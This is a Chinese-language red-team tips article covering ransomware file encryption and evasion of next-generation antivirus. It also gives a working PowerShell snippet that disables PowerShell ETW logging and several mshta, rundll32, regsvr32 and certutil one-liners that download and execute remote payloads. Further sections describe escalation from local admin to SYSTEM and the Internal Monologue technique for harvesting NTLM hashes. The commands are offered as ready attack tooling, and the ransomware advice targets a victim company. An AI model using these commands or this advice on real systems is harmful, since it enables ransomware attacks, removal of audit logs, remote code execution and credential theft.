### 加密恶意软件的方法

在加密恶意软件时，建议使用简单的方法。可以采用标准的AES加密算法，并使用密钥，或者利用公共或私有的x509证书进行加密，甚至简单的按位异或操作也是可行的。加密过程越复杂，恢复文件的可能性就越低。

### 测试的重要性

测试是至关重要的。最糟糕的情况莫过于目标公司无法恢复关键文件，而你的解密程序也无法正常工作。因此，在部署之前，请务必对恶意软件进行全面测试。

### 绕过下一代杀毒软件检测

许多下一代杀毒软件会基于特定的行为模式自动阻止勒索软件。例如，如果勒索软件执行以下步骤：扫描系统中所有类型为X的文件、加密这些文件、删除磁盘中的副本并禁用备份功能，那么它很可能会被检测到。为了绕过这种检测机制，你可以考虑减慢勒索软件的操作速度，或者通过不同的方法达到相同的效果。

### 禁用PowerShell日志记录

作为红队成员，我们不断寻找新的方法来禁用任何形式的日志记录。下面是一个由leechristensen编写的示例脚本，用于禁用PowerShell日志记录：

```powershell
$EtwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static');
$EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid());
$EtwProvider.SetValue($null, $EventProvider);
```

### 从命令行下载和执行远程文件

如果你已经获得了命令执行权限，无论是通过应用程序漏洞还是通过Office或PDF文件，下一步可能是下载并运行辅助恶意软件。Windows提供了一些特性可以帮助完成这一任务。以下是一些常见的例子（感谢arno0x0x和@subtee的研究）：

- `mshta vbscript:Close(Execute("GetObject(""script: http://webserver/payload.sct"")"))`
- `mshta http://webserver/payload.hta`
- `rundll32.exe javascript:"..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();`
- `regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll`
- `certutil -urlcache -split -f http://webserver/payload payload`
- `certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll`
- `certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe`

### 从本地管理员权限提升到系统权限

从本地管理员权限提升到系统权限有多种方法。虽然Metasploit的`getsystem`是最常用的方式，但有时可能不可行。decoder-it开发了一个PowerShell脚本，通过创建一个新的进程并将该进程的父进程PID设置为系统拥有的进程，从而将本地管理员权限的PowerShell提示符提升到系统权限。此脚本可以在[此处](https://github.com/decoder-it/psgetsys)找到。

执行以下命令：
```powershell
PS> . .\psgetsys.ps1
PS>[MyProcess]::CreateProcessFromParent(, )
```

### 在不触及LSASS的情况下检索NTLM哈希值

Elad Shamir研究了一种无需操作`lsass.exe`进程即可获取NTLM哈希值的方法。他开发了所谓的“内部独白攻击”（Internal Monologue Attack），其步骤如下：

1. 修改`LMCompatibilityLevel`、`NTLMMinClientSec`和`RestrictSendingNTLMTraffic`以禁用NetNTLMv1。
2. 从当前运行的所有进程中检索非网络登录令牌，并模拟关联用户。
3. 对每个模拟用户，获取正在运行的用户token，与NTLM SSP交互，控制Challenge为固定值，导出返回的Net-NTLMv1响应。
4. 恢复上述参数的原始值。

更多信息请参阅[GitHub仓库](https://github.com/eladshamir/Internal-Monologue)。

### 使用防御工具构建训练和监控环境

Chris Long开发了一个名为Detection Lab的强大工具，它结合了Packer和Vagrant脚本，可以快速部署一个包含Windows Active Directory的实验环境。该工具包括一系列端点安全和日志记录的最佳实践工具。Detection Lab由四个主机组成：

- **DC**：Windows 2016域控制器
- **WEF**：管理Windows事件集合的Windows 2016服务器
- **Win10**：模拟非服务器端点的Windows 10主机
- **Logger**：运行Splunk和Fleet服务器的Ubuntu 16.04主机

更多详细信息请参阅[官方文档](https://medium.com/@clong/introducing-detection-lab-61db34bed6ae)。

### 总结

对于红队来说，掌握各种技巧和策略是我们入侵艺术的一部分。我们必须不断研究更好的攻击方法和逃避检测的技术。这需要大量的练习、汗水和眼泪。希望本文提供的技巧对你有所帮助。